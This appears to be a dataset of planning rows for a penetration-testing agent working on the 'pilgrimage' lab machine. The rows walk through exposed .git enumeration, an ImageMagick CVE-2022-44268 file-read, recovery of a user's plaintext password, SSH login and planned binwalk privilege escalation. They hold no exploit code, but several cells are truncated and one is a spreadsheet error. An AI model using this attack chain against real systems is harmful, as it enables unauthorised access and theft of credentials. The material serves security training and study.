   1.4 Enumerate HTTP service - [completed] {Webpage contains an image shrinker feature, Feroxbuster tool used for directory and file enumeration, Found 46 paths with 0 errors, Significant paths found: http://pilgrimage.htb/.git/, http://pilgrimage.htb/.git/logs/, http://pilgrimage.htb/assets/, http://pilgrimage.htb/assets/css/, http://pilgrimage.htb/assets/images/, http://pilgrimage.htb/assets/js/, http://pilgrimage.htb/tmp/, http://pilgrimage.htb/vendor/, http://pilgrimage.htb/vendor/jquery/}
   1.5 Dump and analyze Git repository - [completed] {Git-dumper tool used to clone Git repository, Full clone of the Git repository has been obtained and is ready for further enumeration, The repository contains the source code of the web application, primarily consisting of PHP files and assets, A binary named 'magick' is present in the files, part of the ImageMagick software suite used for editing and manipulating digital images}
   1.6 Check the version of the 'magick' tool - [completed] {ImageMagick version 7.1.0-49 has two significant vulnerabilities: CVE-2022-44268 and CVE-2022-44267. Both vulnerabilities are related to processing PNG images, Public exploits are available, Users of ImageMagick 7.1.0-49 are strongly advised to upgrade to a patched version to mitigate these vulnerabilities}
   1.7 Plan for Exploitation - [completed] {The vulnerability occurs when parsing PNG files, which may contain embedded references to other files. A malicious actor could craft a PNG or use an existing one and add a textual chunk type (e.g., tEXt) with the keyword ""profile"" that ImageMagick interprets as a filename and loads the content as a raw profile. Exploitation path involves crafting a malicious PNG file with a tEXt chunk containing a profile attribute referencing a local file. When ImageMagick is used to process the image, the contents of the referenced files are embedded into the new image. A Proof of Concept (PoC) was tested using a simple Rust application from a GitHub repository. The PoC creates the malicious PNG. The PoC was used to embed the contents of the /etc/passwd file into a PNG image, exploiting CVE-2022-44268. The hex-encoded contents of the /etc/passwd file were successfully embedded inside the PNG as part of the exploit}
   1.8 Analyze the Exploit Output - [completed] {A Python script was used to convert a hex-encoded string back into readable text. The output reveals the contents of the /etc/passwd file from the system where the ImageMagick exploit was tested. The /etc/passwd file contains user account information, including usernames and their respective user and group IDs, home directories, and default shells. Notable users found include 'root', 'daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp', 'mail', 'news', 'uucp', 'proxy', 'www-data', 'backup', 'list', 'irc', 'gnats', 'nobody', '_apt', 'systemd-network', 'systemd-resolve', 'messagebus', 'timesync', 'emily', 'systemd-coredump', 'sshd', and '_laurel'}
   1.9 Further Enumerate the website - [completed] {The PHP script checks if a user session exists. If a session exists, it connects to an SQLite database located at /var/db/pilgrimage. It prepares an SQL statement to insert into the 'images' table the URL, original file name, and username. If the execution is successful, it redirects to a success page; otherwise, it redirects to a failure page. If a user session does not exist, it directly redirects to a failure page. The location of the SQLite database is /var/db/pilgrimage.}
   1.10 Exploit the selected exploitations - [completed] {The exploit was re-run, this time targeting the /var/db/pilgrimage file. The same procedure was followed, trimming the \n characters and converting the file to bytes. The bytes were then saved into a file using a Python script. The saved file, named 'sql.db', was confirmed to be an SQLite 3.x database using the 'file' command. The database can now be opened using the sqlite3 command for further exploration.}
   1.11 Enumerate the Database Tables - [completed] {The SQLite database contains two tables: 'images' and 'users'. A SQL query was executed to select all data from the 'users' table. The query returned a username 'emily' and a password 'abigchonkyboi123'.}
   1.12 Plan Next Steps Based on Database Enumeration - [to-do] {An attempt will be made to SSH into the system using these obtained credentials.}",Enumerate the tables and try to find credentials,"1. The previous steps were successful in exploiting a vulnerability to read the SQLite database and convert it into a readable format. This database was located in the /var/db/pilgrimage file and could potentially contain valuable information.

2. Given the findings so far, it is logical to explore the database further. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. Accessing the database could provide additional valuable information such as user credentials or other sensitive data.

3. In the context of the selected strategy, exploring suspicious files, commands, and creating a summary of the findings involves enumerating the tables in the database and trying to find credentials. This could potentially allow for the identification of user credentials, which could be used to gain further access to the system.

4. Once the enumeration is complete, the findings should be summarized. This summary could include the names of the tables in the database, any identified credentials, and any other significant findings. This summary will provide a clear overview of the findings from the database and can be used to plan the next steps.

5. Therefore, the selected step is to explore the suspicious files, commands and create a summary of the findings by enumerating the database to find credentials. This step could potentially provide valuable information for further exploitation and aligns with the selected strategy of enumerating the tables and trying to find credentials.","- The SQLite database contains two tables: 'images' and 'users'.
- A SQL query was executed to select all data from the 'users' table.
- The query returned a username 'emily' and a password 'abigchonkyboi123'.
- An attempt will be made to SSH into the system using these obtained credentials.",Login using the credentials revealed,"1. The intended task of the previous step was to enumerate the tables in the SQLite database and try to find credentials. This task was successfully achieved. The SQLite database was explored, and it was found to contain two tables: 'images' and 'users'. A SQL query was executed to select all data from the 'users' table, which returned a username 'emily' and a password 'abigchonkyboi123'.

2. The successful retrieval of the username and password is a significant finding. It provides a potential means to authenticate and gain further access to the system. However, it is not yet known whether these credentials are valid, requiring further steps to validate them.

3. Given these findings, the logical next step is to attempt to login using the revealed credentials. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. Accessing the system using these credentials could potentially provide a means to further explore the system and identify additional vulnerabilities.

4. Therefore, the selected strategy is to login using the credentials revealed. This strategy is chosen based on the successful retrieval of the username and password and the potential for these credentials to provide further access to the system.",Exploit the selected exploitations,"1. The previous steps were successful in enumerating the SQLite database and revealing a username and password. These credentials could potentially provide a means to authenticate and gain further access to the system.

2. Given the findings so far, it is logical to attempt to login using these revealed credentials. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. 

3. In the context of the selected strategy, exploiting the selected exploitations involves attempting to login using the revealed credentials. This could potentially allow for the identification of additional vulnerabilities or provide further access to the system.

4. Once the login attempt is made, the results should be analyzed. If the login is successful, it would confirm that the revealed credentials are valid and provide further access to the system. If the login is unsuccessful, it would indicate that the credentials are not valid, requiring further exploration or a change in strategy.

5. Therefore, the selected step is to exploit the selected exploitations by attempting to login using the revealed credentials. This step could potentially provide valuable information for further exploitation and aligns with the selected strategy of logging in using the credentials revealed.","{'Metasploit': 'Attempt to login using the revealed credentials to exploit vulnerabilities.', 'hydra': 'Perform an online brute force login attempt with the revealed credentials.'}"
pilgrimage,"1. Reconnaissance - [completed] {Target IP:10.129.237.31}
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - [completed]
       1.3.1 Perform a port scan - [completed] {Host Status: Up, Latency: 0.95s, Closed TCP Ports: 998, Open Ports: 22, 80}
       1.3.2 Determine the services and versions on each open port - [completed] {Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), SSH-Hostkey: RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3, ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af, ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04, Port 80: Open, Service: HTTP, Version: nginx 1.18.0, HTTP Title: Did not follow redirect to http://pilgrimage.htb/, HTTP Server Header: nginx/1.18.0, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
   1.4 Enumerate HTTP service - [completed] {Webpage contains an image shrinker feature, Feroxbuster tool used for directory and file enumeration, Found 46 paths with 0 errors, Significant paths found: http://pilgrimage.htb/.git/, http://pilgrimage.htb/.git/logs/, http://pilgrimage.htb/assets/, http://pilgrimage.htb/assets/css/, http://pilgrimage.htb/assets/images/, http://pilgrimage.htb/assets/js/, http://pilgrimage.htb/tmp/, http://pilgrimage.htb/vendor/, http://pilgrimage.htb/vendor/jquery/}
   1.5 Dump and analyze Git repository - [completed] {Git-dumper tool used to clone Git repository, Full clone of the Git repository has been obtained and is ready for further enumeration, The repository contains the source code of the web application, primarily consisting of PHP files and assets, A binary named 'magick' is present in the files, part of the ImageMagick software suite used for editing and manipulating digital images}
   1.6 Check the version of the 'magick' tool - [completed] {ImageMagick version 7.1.0-49 has two significant vulnerabilities: CVE-2022-44268 and CVE-2022-44267. Both vulnerabilities are related to processing PNG images, Public exploits are available, Users of ImageMagick 7.1.0-49 are strongly advised to upgrade to a patched version to mitigate these vulnerabilities}
   1.7 Plan for Exploitation - [completed] {The vulnerability occurs when parsing PNG files, which may contain embedded references to other files. A malicious actor could craft a PNG or use an existing one and add a textual chunk type (e.g., tEXt) with the keyword ""profile"" that ImageMagick interprets as a filename and loads the content as a raw profile. Exploitation path involves crafting a malicious PNG file with a tEXt chunk containing a profile attribute referencing a local file. When ImageMagick is used to process the image, the contents of the referenced files are embedded into the new image. A Proof of Concept (PoC) was tested using a simple Rust application from a GitHub repository. The PoC creates the malicious PNG. The PoC was used to embed the contents of the /etc/passwd file into a PNG image, exploiting CVE-2022-44268. The hex-encoded contents of the /etc/passwd file were successfully embedded inside the PNG as part of the exploit}
   1.8 Analyze the Exploit Output - [completed] {A Python script was used to convert a hex-encoded string back into readable text. The output reveals the contents of the /etc/passwd file from the system where the ImageMagick exploit was tested. The /etc/passwd file contains user account information, including usernames and their respective user and group IDs, home directories, and default shells. Notable users found include 'root', 'daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp', 'mail', 'news', 'uucp', 'proxy', 'www-data', 'backup', 'list', 'irc', 'gnats', 'nobody', '_apt', 'systemd-network', 'systemd-resolve', 'messagebus', 'timesync', 'emily', 'systemd-coredump', 'sshd', and '_laurel'}
   1.9 Further Enumerate the website - [completed] {The PHP script checks if a user session exists. If a session exists, it connects to an SQLite database located at /var/db/pilgrimage. It prepares an SQL statement to insert into the 'images' table the URL, original file name, and username. If the execution is successful, it redirects to a success page; otherwise, it redirects to a failure page. If a user session does not exist, it directly redirects to a failure page. The location of the SQLite database is /var/db/pilgrimage.}
   1.10 Exploit the selected exploitations - [completed] {The exploit was re-run, this time targeting the /var/db/pilgrimage file. The same procedure was followed, trimming the \n characters and converting the file to bytes. The bytes were then saved into a file using a Python script. The saved file, named 'sql.db', was confirmed to be an SQLite 3.x database using the 'file' command. The database can now be opened using the sqlite3 command for further exploration.}
   1.11 Enumerate the Database Tables - [completed] {The SQLite database contains two tables: 'images' and 'users'. A SQL query was executed to select all data from the 'users' table. The query returned a username 'emily' and a password 'abigchonkyboi123'.}
   1.12 Login Using the Revealed Credentials - [completed] {A successful SSH login was made into the system as the 'emily' user. The host 'pilgrimage.htb' was previously unknown, but its authenticity was confirmed and added to the list of known hosts. The system is running Linux pilgrimage 5.10.0-23-amd64, a Debian distribution. The 'id' command confirms that the user 'emily' has a user ID and group ID of 1000.}
   1.13 Plan Next Steps Based on Login Results - [to-do] {Based on the successful login as the 'emily' user.}",Login using the credentials revealed,"1. The previous steps were successful in enumerating the SQLite database and revealing a username and password. These credentials could potentially provide a means to authenticate and gain further access to the system.

2. Given the findings so far, it is logical to attempt to login using these revealed credentials. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. 

3. In the context of the selected strategy, exploiting the selected exploitations involves attempting to login using the revealed credentials. This could potentially allow for the identification of additional vulnerabilities or provide further access to the system.

4. Once the login attempt is made, the results should be analyzed. If the login is successful, it would confirm that the revealed credentials are valid and provide further access to the system. If the login is unsuccessful, it would indicate that the credentials are not valid, requiring further exploration or a change in strategy.

5. Therefore, the selected step is to exploit the selected exploitations by attempting to login using the revealed credentials. This step could potentially provide valuable information for further exploitation and aligns with the selected strategy of logging in using the credentials revealed.","- A successful SSH login was made into the system as the 'emily' user.
- The host 'pilgrimage.htb' was previously unknown, but its authenticity was confirmed and added to the list of known hosts.
- The system is running Linux pilgrimage 5.10.0-23-amd64, a Debian distribution.
- The 'id' command confirms that the user 'emily' has a user ID and group ID of 1000.","Enumerate the files, commands and their privileges to escalate th privileges.","1. The intended task of the previous step was to login using the revealed credentials. This task was successfully achieved. A successful SSH login was made into the system as the 'emily' user. The host 'pilgrimage.htb' was previously unknown, but its authenticity was confirmed and added to the list of known hosts. The system is running Linux pilgrimage 5.10.0-23-amd64, a Debian distribution. The 'id' command confirms that the user 'emily' has a user ID and group ID of 1000.

2. The successful login into the system as the 'emily' user is a significant finding. It provides a means to access the system and potentially identify additional vulnerabilities or sensitive information. However, the current access level may be limited, and further steps are required to explore the system and potentially escalate privileges.

3. Given these findings, the logical next step is to enumerate the files, commands, and their privileges. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. Enumerating the files, commands, and their privileges could potentially identify additional vulnerabilities or sensitive information that could be exploited to escalate privileges.

4. Therefore, the selected strategy is to enumerate the files, commands, and their privileges to escalate the privileges. This strategy is chosen based on the successful login into the system and the potential for further exploitation through enumeration and privilege escalation.","Explore the suspicious files, commands and create a summary of the findings","1. The previous steps were successful in gaining access to the system as the 'emily' user. This is a significant achievement as it provides a foothold inside the system. However, the access level of the 'emily' user may be limited, potentially restricting the ability to fully explore the system and identify further vulnerabilities.

2. Given the access to the system, it is logical to further explore the system to gain more information. This includes enumerating the files, commands, and their privileges. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. 

3. In the context of the selected strategy, exploring the suspicious files, commands, and creating a summary of the findings involves enumerating the system's files, identifying any suspicious or unusual files or commands, and summarizing the findings. This could potentially reveal additional information about the system, such as the presence of sensitive files, misconfigured permissions, or other vulnerabilities that could be exploited to escalate privileges.

4. Once the exploration is complete, the findings should be analyzed to identify potential avenues for further exploitation. This could involve exploiting misconfigured permissions, leveraging sensitive information found in files, or exploiting other identified vulnerabilities.

5. Therefore, the selected step is to explore the suspicious files, commands, and create a summary of the findings. This step could potentially reveal additional information about the system that could be used to escalate privileges and further exploit the system. This aligns with the selected strategy of enumerating the files, commands, and their privileges to escalate the privileges.","{'Interactive CLI': 'Enumerate system files and commands, identify suspicious files or commands, and summarize findings.'}"
pilgrimage,"1. Reconnaissance - [completed] {Target IP:10.129.237.31}
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - [completed]
       1.3.1 Perform a port scan - [completed] {Host Status: Up, Latency: 0.95s, Closed TCP Ports: 998, Open Ports: 22, 80}
       1.3.2 Determine the services and versions on each open port - [completed] {Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), SSH-Hostkey: RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3, ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af, ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04, Port 80: Open, Service: HTTP, Version: nginx 1.18.0, HTTP Title: Did not follow redirect to http://pilgrimage.htb/, HTTP Server Header: nginx/1.18.0, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
   1.4 Enumerate HTTP service - [completed] {Webpage contains an image shrinker feature, Feroxbuster tool used for directory and file enumeration, Found 46 paths with 0 errors, Significant paths found: http://pilgrimage.htb/.git/, http://pilgrimage.htb/.git/logs/, http://pilgrimage.htb/assets/, http://pilgrimage.htb/assets/css/, http://pilgrimage.htb/assets/images/, http://pilgrimage.htb/assets/js/, http://pilgrimage.htb/tmp/, http://pilgrimage.htb/vendor/, http://pilgrimage.htb/vendor/jquery/}
   1.5 Dump and analyze Git repository - [completed] {Git-dumper tool used to clone Git repository, Full clone of the Git repository has been obtained and is ready for further enumeration, The repository contains the source code of the web application, primarily consisting of PHP files and assets, A binary named 'magick' is present in the files, part of the ImageMagick software suite used for editing and manipulating digital images}
   1.6 Check the version of the 'magick' tool - [completed] {ImageMagick version 7.1.0-49 has two significant vulnerabilities: CVE-2022-44268 and CVE-2022-44267. Both vulnerabilities are related to processing PNG images, Public exploits are available, Users of ImageMagick 7.1.0-49 are strongly advised to upgrade to a patched version to mitigate these vulnerabilities}
   1.7 Plan for Exploitation - [completed] {The vulnerability occurs when parsing PNG files, which may contain embedded references to other files. A malicious actor could craft a PNG or use an existing one and add a textual chunk type (e.g., tEXt) with the keyword ""profile"" that ImageMagick interprets as a filename and loads the content as a raw profile. Exploitation path involves crafting a malicious PNG file with a tEXt chunk containing a profile attribute referencing a local file. When ImageMagick is used to process the image, the contents of the referenced files are embedded into the new image. A Proof of Concept (PoC) was tested using a simple Rust application from a GitHub repository. The PoC creates the malicious PNG. The PoC was used to embed the contents of the /etc/passwd file into a PNG image, exploiting CVE-2022-44268. The hex-encoded contents of the /etc/passwd file were successfully embedded inside the PNG as part of the exploit}
   1.8 Analyze the Exploit Output - [completed] {A Python script was used to convert a hex-encoded string back into readable text. The output reveals the contents of the /etc/passwd file from the system where the ImageMagick exploit was tested. The /etc/passwd file contains user account information, including usernames and their respective user and group IDs, home directories, and default shells. Notable users found include 'root', 'daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp', 'mail', 'news', 'uucp', 'proxy', 'www-data', 'backup', 'list', 'irc', 'gnats', 'nobody', '_apt', 'systemd-network', 'systemd-resolve', 'messagebus', 'timesync', 'emily', 'systemd-coredump', 'sshd', and '_laurel'}
   1.9 Further Enumerate the website - [completed] {The PHP script checks if a user session exists. If a session exists, it connects to an SQLite database located at /var/db/pilgrimage. It prepares an SQL statement to insert into the 'images' table the URL, original file name, and username. If the execution is successful, it redirects to a success page; otherwise, it redirects to a failure page. If a user session does not exist, it directly redirects to a failure page. The location of the SQLite database is /var/db/pilgrimage.}
   1.10 Exploit the selected exploitations - [completed] {The exploit was re-run, this time targeting the /var/db/pilgrimage file. The same procedure was followed, trimming the \n characters and converting the file to bytes. The bytes were then saved into a file using a Python script. The saved file, named 'sql.db', was confirmed to be an SQLite 3.x database using the 'file' command. The database can now be opened using the sqlite3 command for further exploration.}
   1.11 Enumerate the Database Tables - [completed] {The SQLite database contains two tables: 'images' and 'users'. A SQL query was executed to select all data from the 'users' table. The query returned a username 'emily' and a password 'abigchonkyboi123'.}
   1.12 Login Using the Revealed Credentials - [completed] {A successful SSH login was made into the system as the 'emily' user. The host 'pilgrimage.htb' was previously unknown, but its authenticity was confirmed and added to the list of known hosts. The system is running Linux pilgrimage 5.10.0-23-amd64, a Debian distribution. The 'id' command confirms that the user 'emily' has a user ID and group ID of 1000.}
   1.13 Enumerate Files and Commands - [completed] {The 'ps auxww | grep root' command reveals a Bash script called 'malwarescan.sh' being executed by the root user. The script likely calls the 'inotifywait' command. The 'malwarescan.sh' script monitors the directory /var/www/pilgrimage.htb/shrunk/ for file creations. When a new file is created, the script runs 'binwalk'","Enumerate the files, commands and their privileges to escalate th privileges.","1. The previous steps were successful in gaining access to the system as the 'emily' user. This is a significant achievement as it provides a foothold inside the system. However, the access level of the 'emily' user may be limited, potentially restricting the ability to fully explore the system and identify further vulnerabilities.

2. Given the access to the system, it is logical to further explore the system to gain more information. This includes enumerating the files, commands, and their privileges. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. 

3. In the context of the selected strategy, exploring the suspicious files, commands, and creating a summary of the findings involves enumerating the system's files, identifying any suspicious or unusual files or commands, and summarizing the findings. This could potentially reveal additional information about the system, such as the presence of sensitive files, misconfigured permissions, or other vulnerabilities that could be exploited to escalate privileges.

4. Once the exploration is complete, the findings should be analyzed to identify potential avenues for further exploitation. This could involve exploiting misconfigured permissions, leveraging sensitive information found in files, or exploiting other identified vulnerabilities.

5. Therefore, the selected step is to explore the suspicious files, commands, and create a summary of the findings. This step could potentially reveal additional information about the system that could be used to escalate privileges and further exploit the system. This aligns with the selected strategy of enumerating the files, commands, and their privileges to escalate the privileges.","- The 'ps auxww | grep root' command reveals a Bash script called 'malwarescan.sh' being executed by the root user. The script likely calls the 'inotifywait' command.
- The 'malwarescan.sh' script monitors the directory /var/www/pilgrimage.htb/shrunk/ for file creations.
- When a new file is created, the script runs 'binwalk' on the file and checks the output against a blacklist of strings.
- If the output matches any of the blacklisted strings, the script deletes the file.
- The blacklisted strings are ""Executable script"" and ""Microsoft executable"".",Check the binwalk software version,"1. The intended task of the previous step was to enumerate files and commands. The task was successfully achieved. 'ps auxww | grep root' command revealed a Bash script called 'malwarescan.sh' being executed by the root user. The script monitors the directory /var/www/pilgrimage.htb/shrunk/ for file creations and runs 'binwalk' on the newly created files.

2. The successful enumeration of files and commands revealed that 'malwarescan.sh' script, which is run by the root user, uses 'binwalk'. This is a key finding as it suggests that 'binwalk' might be a potential avenue for privilege escalation. The script checks for file creations in a specific directory and runs 'binwalk' on the new files, which suggests that it could be possible to influence the files that 'binwalk' is run on.

3. Given these findings, the logical next step is to check the version of the 'binwalk' software. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. The version of the 'binwalk' software could potentially reveal known vulnerabilities that could be exploited to escalate privileges.

4. Therefore","Explore the suspicious files, commands and create a summary of the findings.","1. The previous steps were successful in gaining access to the system and identifying a Bash script called 'malwarescan.sh' being executed by the root user. This script uses 'binwalk' to process newly created files in a specific directory. This is a significant finding as it provides insight into the system's operations and potential vulnerabilities.

2. Given the use of 'binwalk' in the 'malwarescan.sh' script, it is logical to further explore the version of 'binwalk' being used. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. The version of 'binwalk' could potentially reveal known vulnerabilities that could be exploited for privilege escalation.

3. In the context of the selected strategy, exploring the suspicious files, commands, and creating a summary of the findings involves checking the version of 'binwalk'. This could potentially reveal additional vulnerabilities or misconfigurations that could be exploited to escalate privileges.

4. Once the version of 'binwalk' is known, the findings should be summarized and analyzed to identify potential avenues for further exploitation",{'Interactive CLI': 'Create a summary of the findings.'}
pilgrimage,"1. Reconnaissance - [completed] {Target IP:10.129.237.31}
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - [completed]
       1.3.1 Perform a port scan - [completed] {Host Status: Up, Latency: 0.95s, Closed TCP Ports: 998, Open Ports: 22, 80}
       1.3.2 Determine the services and versions on each open port - [completed] {Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), SSH-Hostkey: RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3, ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af, ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04, Port 80: Open, Service: HTTP, Version: nginx 1.18.0, HTTP Title: Did not follow redirect to http://pilgrimage.htb/, HTTP Server Header: nginx/1.18.0, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
   1.4 Enumerate HTTP service - [completed] {Webpage contains an image shrinker feature, Feroxbuster tool used for directory and file enumeration, Found 46 paths with 0 errors, Significant paths found: http://pilgrimage.htb/.git/, http://pilgrimage.htb/.git/logs/, http://pilgrimage.htb/assets/, http://pilgrimage.htb/assets/css/, http://pilgrimage.htb/assets/images/, http://pilgrimage.htb/assets/js/, http://pilgrimage.htb/tmp/, http://pilgrimage.htb/vendor/, http://pilgrimage.htb/vendor/jquery/}
   1.5 Dump and analyze Git repository - [completed] {Git-dumper tool used to clone Git repository, Full clone of the Git repository has been obtained and is ready for further enumeration, The repository contains the source code of the web application, primarily consisting of PHP files and assets, A binary named 'magick' is present in the files, part of the ImageMagick software suite used for editing and manipulating digital images}
   1.6 Check the version of the 'magick' tool - [completed] {ImageMagick version 7.1.0-49 has two significant vulnerabilities: CVE-2022-44268 and CVE-2022-44267. Both vulnerabilities are related to processing PNG images, Public exploits are available, Users of ImageMagick 7.1.0-49 are strongly advised to upgrade to a patched version to mitigate these vulnerabilities}
   1.7 Plan for Exploitation - [completed] {The vulnerability occurs when parsing PNG files, which may contain embedded references to other files. A malicious actor could craft a PNG or use an existing one and add a textual chunk type (e.g., tEXt) with the keyword ""profile"" that ImageMagick interprets as a filename and loads the content as a raw profile. Exploitation path involves crafting a malicious PNG file with a tEXt chunk containing a profile attribute referencing a local file. When ImageMagick is used to process the image, the contents of the referenced files are embedded into the new image. A Proof of Concept (PoC) was tested using a simple Rust application from a GitHub repository. The PoC creates the malicious PNG. The PoC was used to embed the contents of the /etc/passwd file into a PNG image, exploiting CVE-2022-44268. The hex-encoded contents of the /etc/passwd file were successfully embedded inside the PNG as part of the exploit}
   1.8 Analyze the Exploit Output - [completed] {A Python script was used to convert a hex-encoded string back into readable text. The output reveals the contents of the /etc/passwd file from the system where the ImageMagick exploit was tested. The /etc/passwd file contains user account information, including usernames and their respective user and group IDs, home directories, and default shells. Notable users found include 'root', 'daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp', 'mail', 'news', 'uucp', 'proxy', 'www-data', 'backup', 'list', 'irc', 'gnats', 'nobody', '_apt', 'systemd-network', 'systemd-resolve', 'messagebus', 'timesync', 'emily', 'systemd-coredump', 'sshd', and '_laurel'}
   1.9 Further Enumerate the website - [completed] {The PHP script checks if a user session exists. If a session exists, it connects to an SQLite database located at /var/db/pilgrimage. It prepares an SQL statement to insert into the 'images' table the URL, original file name, and username. If the execution is successful, it redirects to a success page; otherwise, it redirects to a failure page. If a user session does not exist, it directly redirects to a failure page. The location of the SQLite database is /var/db/pilgrimage.}
   1.10 Exploit the selected exploitations - [completed] {The exploit was re-run, this time targeting the /var/db/pilgrimage file. The same procedure was followed, trimming the \n characters and converting the file to bytes. The bytes were then saved into a file using a Python script. The saved file, named 'sql.db', was confirmed to be an SQLite 3.x database using the 'file' command. The database can now be opened using the sqlite3 command for further exploration.}
   1.11 Enumerate the Database Tables - [completed] {The SQLite database contains two tables: 'images' and 'users'. A SQL query was executed to select all data from the 'users' table. The query returned a username 'emily' and a password 'abigchonkyboi123'.}
   1.12 Login Using the Revealed Credentials - [completed] {A successful SSH login was made into the system as the 'emily' user. The host 'pilgrimage.htb' was previously unknown",Check the binwalk software version,"1. The previous steps were successful in gaining access to the system and identifying a Bash script called 'malwarescan.sh' being executed by the root user. This script uses 'binwalk' to process newly created files in a specific directory. This is a significant finding as it provides insight into the system's operations and potential vulnerabilities.

2. Given the use of 'binwalk' in the 'malwarescan.sh' script, it is logical to further explore the version of 'binwalk' being used. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. The version of 'binwalk' could potentially reveal known vulnerabilities that could be exploited for privilege escalation.

3. In the context of the selected strategy, exploring the suspicious files, commands, and creating a summary of the findings involves checking the version of 'binwalk'. This could potentially reveal additional vulnerabilities or misconfigurations that could be exploited to escalate privileges.

4. Once the version of 'binwalk' is known, the findings should be summarized and analyzed to identify potential avenues for further exploitation",#NAME?,Do a vulnearbility analysis on the Binwalk v2.3.2,"1. The intended task of the previous step was to check the version of the 'binwalk' software. This task was successfully achieved, and it was found that the system is using Binwalk v2.3.2.

2. The successful checking of the 'binwalk' version is a key finding as it provides specific information about the software being used in the system. This information could potentially be used to identify known vulnerabilities in the specific version of the software being used, which could then be exploited to escalate privileges.

3. Given these findings, the logical next step is to do a vulnerability analysis on Binwalk v2.3.2. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. The vulnerability analysis could potentially reveal known vulnerabilities in Binwalk v2.3.2 that could be exploited to escalate privileges.

4. Therefore, the selected strategy is to do a vulnerability analysis on Binwalk v2.3.2. This step could potentially reveal vulnerabilities that could be exploited to escalate privileges, aligning with the overall goal of gaining further access to the system. This strategy is a continuation of the previous strategy, as it builds upon the information gained in the previous step.",Do a google search for more information,"1. The previous steps were successful in identifying that a Bash script called 'malwarescan.sh' is being executed by the root user and uses 'binwalk' to process newly created files. We also found out that the version of 'binwalk' being used is v2.3.2.

2. Given this information, it is logical to further explore potential vulnerabilities in 'binwalk' v2.3.2. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system.

3. In the context of the selected strategy, doing a Google search for more information involves searching for known vulnerabilities in 'binwalk' v2.3.2 and potential ways to exploit them. This could potentially reveal additional vulnerabilities or misconfigurations that could be exploited to escalate privileges.

4. Once the Google search is completed, the findings should be analyzed and used to plan the next steps. This could potentially include exploiting identified vulnerabilities, or it could lead to the identification of new strategies or avenues for further exploration.

5. Therefore, the selected step of doing a Google search for more information is a logical next step given the information gained in the previous steps and the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system.","{'Google search': ""Search for known vulnerabilities in 'binwalk' v2.3.2 and potential exploitation methods.""}"
pilgrimage,"1. Reconnaissance - [completed] {Target IP:10.129.237.31}
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - [completed]
       1.3.1 Perform a port scan - [completed] {Host Status: Up, Latency: 0.95s, Closed TCP Ports: 998, Open Ports: 22, 80}
       1.3.2 Determine the services and versions on each open port - [completed] {Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), SSH-Hostkey: RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3, ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af, ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04, Port 80: Open, Service: HTTP, Version: nginx 1.18.0, HTTP Title: Did not follow redirect to http://pilgrimage.htb/, HTTP Server Header: nginx/1.18.0, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
   1.4 Enumerate HTTP service - [completed] {Webpage contains an image shrinker feature, Feroxbuster tool used for directory and file enumeration, Found 46 paths with 0 errors, Significant paths found: http://pilgrimage.htb/.git/, http://pilgrimage.htb/.git/logs/, http://pilgrimage.htb/assets/, http://pilgrimage.htb/assets/css/, http://pilgrimage.htb/assets/images/, http://pilgrimage.htb/assets/js/, http://pilgrimage.htb/tmp/, http://pilgrimage.htb/vendor/, http://pilgrimage.htb/vendor/jquery/}
